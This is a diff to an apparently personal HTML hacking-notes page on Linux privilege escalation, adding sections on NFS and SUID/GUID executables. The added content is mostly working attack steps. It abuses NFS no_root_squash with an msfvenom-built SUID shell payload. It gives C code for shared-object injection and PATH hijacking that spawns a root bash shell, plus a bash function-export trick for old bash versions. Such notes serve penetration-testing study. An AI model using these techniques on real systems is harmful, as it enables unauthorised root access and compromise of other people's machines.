@@ -7,6 +7,8 @@ layout: default
     <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
 </head>
 
+<hr>
+
 <body>
 
     <h1>Linux PrivEsc</h1>
@@ -336,6 +338,137 @@ static void hijack() __attribute__((constructor));
                 </ul>
             </ul>
         </ul>
+    </ul>
+
+    <h2>NFS</h2>
+
+    <table>
+        <tr>
+            <td>Show the NFS server’s export list</td>
+            <td>showmount -e &lt;target&gt;</td>
+        </tr>
+        <tr>
+            <td>Show NFS shares with nmap</td>
+            <td>nmap –sV –script=nfs-showmount &lt;target&gt;</td>
+        </tr>
+        <tr>
+            <td>Mount an NFS share</td>
+            <td>mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; &lt;local_directory&gt;</td>
+        </tr>
+    </table>
+
+    <li>NFS share information is stored in /etc/exports</li>
+    <li>Root Squashing</li>
+    <ul>
+        <li>When a remote user is root NFS will squash them and treat then as "nobody" user.  However, root squashing can be turned off and users who connect as root will remain root</li>
+        <ul>
+            <li>On victim machine:</li>
+            <ul>
+                <li>Check /etc/exports to see if no_root_squash is listed.  If so, root squashing is disabled.</li>
+            </ul>
+            <li>On attack machine:</li>
+            <ul>
+                <li>Confirm NFS share is available for remote mounting</li>
+                <ul>
+                    <li>showmount -e &lt;target ip&gt;</li>
+                </ul>
+                <li>mkdir /tmp/nfs</li>
+                <li>mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; /tmp/nfs</li>
+                <li>sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf</li>
+                <li>chmod +xs /tmp/nfs/shell.elf</li>
+            </ul>
+            <li>On victim machine</li>
+            <ul>
+                <li>Execute payload</li>
+                <ul>
+                    <li>/tmp/shell.elf</li>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+
+    <h2>SUID and GUID executables</h2>
+
+    <table>
+        <tr>
+            <td>Find files with guid or suid set</td>
+            <td>find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null</td>
+        </tr>
+        <tr>
+            <td>See which commands/executables a file is trying to run</td>
+            <td>strings &lt;program&gt;</td>
+        </tr>
+        <tr>
+            <td>Confirm which executable/command a program is trying to run</td>
+            <td>
+                <li>strace -v -f -e execve &lt;program&gt; 2>&1 | grep executable/command</li>
+                <li>ltrace &lt;program&gt;</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Check file for missing shared objects</td>
+            <td>ld &lt;executable&gt;</td>
+        </tr>
+        <tr>
+            <td>Update cache to include new shared objects</td>
+            <td>ldconfig</td>
+        </tr>
+    </table>
+
+    <li>Check GTFOBins for flags to use in order to execute malicious commands</li>
+    <li>Binary being called is not absolute (scp vs /usr/bin/scp)</li>
+    <li>Shared object not found</li>
+    <ul>
+        <li>Vulnerability to shared object injection</li>
+        <ul>
+            <li>Find shared objects that are not found by the executable</li>
+            <li>Create a shared object in the directory where the shared object is being searched for</li>
+            <pre>
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+int main(void)
+{
+setuid(0); setgid(0); system(&quot;/bin/bash&quot;);
+}
+
+#gcc rootshell.c -o libmalbec.so -shared -Wall -fPIC -w
+            </pre>
+            <li>gcc: error trying to exec 'cc1': execvp: No such file or directory</li>
+            <ul>
+                <li>Check environment variables to make sure PATH has been set</li>
+                <ul>
+                    <li>export</li>
+                </ul>
+                <li>If PATH has not been set, then set it</li>
+                <ul>
+                    <li>export PATH</li>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>File calls for executable without absolute path</li>
+    <ul>
+        <li>Create a malicious executable with the same name as the program that is being called without an absolute path</li>
+        <pre>
+int main() {
+    setuid(0);
+    system("/bin/bash -p");
+}
+#gcc -o &lt;file&gt; &lt;file.c&gt;
+        </pre>
+        <li>PATH=.:$PATH</li>
+        <li>Execute vulnerable SUID/GUID</li>
+        <li>Rooted</li>
+    </ul>
+
+    <li>Calls for executable w/ absolute path and bash < 4.2-048</li>
+    <ul>
+        <li>function &lt;exectuable being called&gt; { /bin/bash -p; }</li>
+        <li>export -f &lt;exectuable being called&gt;</li>
+        <li>execute vulnerable suid/guid file</li>
+        <li>Rooted</li>
     </ul>
 
 
